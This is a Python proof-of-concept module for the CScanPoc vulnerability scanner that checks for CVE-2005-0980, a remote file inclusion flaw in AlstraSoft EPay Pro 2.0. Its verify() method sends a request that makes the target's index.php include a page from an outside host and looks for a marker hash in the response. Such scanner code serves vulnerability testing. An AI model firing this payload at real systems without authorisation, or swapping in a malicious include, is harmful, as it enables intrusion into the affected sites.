# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'AlstraSoft_0000' # 平台漏洞编号
    name = 'AlstraSoft EPay Pro 2.0 - Remote File Include Vulnerability' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2005-05-02'  # 漏洞公布时间
    desc = '''
        AlstraSoft EPay Pro 2.0远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'www.sebug.net/vuldb/ssvid-78990' # 
    cnvd_id = 'CNNVD-200505-399' # cnvd漏洞编号
    cve_id = 'CVE-2005-0980'  # cve编号
    product = 'AlstraSoft'  # 漏洞组件名称
    product_version = '2.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3f265106-8acc-4b8f-9fd5-e0e295ba640d' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/epal/index.php?view=http://www.sqlsec.com/admin.html'
            response = requests.get(vul_url).content
            if re.search('765635a65f5919b89a990aaf0cb168d7', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()